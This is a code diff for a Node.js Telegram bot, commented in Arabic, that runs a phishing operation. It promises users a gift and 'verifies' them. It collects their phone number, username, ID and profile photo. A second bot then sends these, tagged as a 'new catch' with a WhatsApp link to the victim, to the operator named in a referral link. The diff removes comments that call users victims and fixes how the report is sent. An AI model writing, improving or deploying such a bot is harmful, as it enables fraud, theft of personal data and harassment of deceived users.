@@ -4,7 +4,6 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// صفحة ويب وهمية للبورت لكي يقبلها Render
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -33,7 +32,6 @@ app.listen(PORT, () => {
     console.log(`سيرفر الويب يعمل على البورت ${PORT}`);
 });
 
-// قراءة التوكنات من متغيرات البيئة للحماية
 const COLLECTOR_TOKEN = process.env.COLLECTOR_BOT_TOKEN;
 const NOTIFIER_TOKEN = process.env.NOTIFIER_BOT_TOKEN;
 
@@ -42,23 +40,21 @@ if (!COLLECTOR_TOKEN || !NOTIFIER_TOKEN) {
     process.exit(1);
 }
 
-// تشغيل بوت التجميع (الذي يضغط فيه المستخدم)
 const bot = new TelegramBot(COLLECTOR_TOKEN, { polling: true });
-// تشغيل بوت التنبيهات (الذي يرسل لك المعلومات)
 const notifierBot = new TelegramBot(NOTIFIER_TOKEN, { polling: false });
 
 console.log("تم تشغيل البوت بنجاح...");
 
-// تخزين الأيدي القادم من الرابط لكل مستخدم
-const referrers = {};
+// استخدام ذاكرة مؤقتة أكثر دقة لتخزين الأيدي المرتبط بالـ Chat ID
+const userReferrerMap = {};
 
-// استقبال أمر البدء مع الأيدي الذي بعد علامة =
 bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const refId = match ? match[1] : null; // هذا هو الأيدي اللي بعد علامة =
+    const refId = match ? match[1] : null;
 
     if (refId) {
-        referrers[chatId] = refId;
+        userReferrerMap[chatId] = refId;
+        console.log(`تم تسجيل الأيدي المستهدف ${refId} للمستخدم ${chatId}`);
     }
 
     const opts = {
@@ -78,7 +74,6 @@ bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
     );
 });
 
-// استقبال رقم الهاتف والبيانات عند مشاركتها
 bot.on('contact', async (msg) => {
     const chatId = msg.chat.id;
     const contact = msg.contact;
@@ -92,10 +87,9 @@ bot.on('contact', async (msg) => {
     const username = user.username ? `@${user.username}` : "لا يوجد يوزر";
     const userId = user.id;
 
-    // جلب الأيدي الذي دخل من خلال رابطه (الموجود بعد =)
-    const targetOwnerId = referrers[chatId];
+    // جلب الأيدي المستهدف
+    const targetOwnerId = userReferrerMap[chatId];
 
-    // جلب خلفية/صورة الحساب الشخصي للضحية
     let profilePhotoUrl = "";
     try {
         const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
@@ -108,11 +102,9 @@ bot.on('contact', async (msg) => {
         console.log("تعذر جلب صورة الحساب:", e.message);
     }
 
-    // تجهيز رابط الواتساب المباشر للضحية
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
 
-    // بناء رسالة التقرير
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
 
@@ -121,18 +113,17 @@ bot.on('contact', async (msg) => {
 🆔 **الأيدي:** ${userId}
 📞 **رقم الهاتف:** +${phone}
 🔗 **رابط الحساب:** tg://user?id=${userId}
-🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "لا يوجد أيدي بالرابط"}
+🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "غير معروف"}
 `;
 
-    // 1. الرد على الضحية في البوت الأساسي وإزالة الكيبورد
+    // الرد على المستخدم
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
     });
 
-    // 2. إرسال البيانات عبر (البوت الثاني) حصراً إلى الأيدي الموجود بنهاية الرابط
+    // التأكد من وجود الأيدي المستهدف قبل الإرسال للبوت الثاني
     if (targetOwnerId) {
         try {
-            // الأزرار الشفافة للمطور (رابط واتساب مباشر لرقم الضحية)
             const inlineKeyboard = {
                 reply_markup: {
                     inline_keyboard: [
@@ -144,21 +135,23 @@ bot.on('contact', async (msg) => {
             };
 
             if (profilePhotoUrl) {
+                // إرسال الصورة مع التقرير والأزرار الشفافة بالطريقة الصحيحة
                 await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
                     caption: reportMessage,
                     parse_mode: "Markdown",
-                    ...inlineKeyboard
+                    reply_markup: inlineKeyboard.reply_markup
                 });
             } else {
                 await notifierBot.sendMessage(targetOwnerId, reportMessage, {
                     parse_mode: "Markdown",
-                    ...inlineKeyboard
+                    reply_markup: inlineKeyboard.reply_markup
                 });
             }
+            console.log(`تم إرسال التقرير بنجاح إلى الأيدي: ${targetOwnerId}`);
         } catch (err) {
-            console.log("فشل إرسال التقرير للأيدي المحدد عبر البوت الثاني:", err.message);
+            console.log("خطأ أثناء إرسال البيانات للبوت الثاني:", err.message);
         }
     } else {
-        console.log("تنبيه: لم يتم العثور على أيدي في الرابط لإرسال التقرير إليه.");
+        console.log("خطأ: لم يتم العثور على الأيدي المستهدف لهذا المستخدم (فقدت الذاكرة المؤقتة أو دخل بدون رابط).");
     }
 });
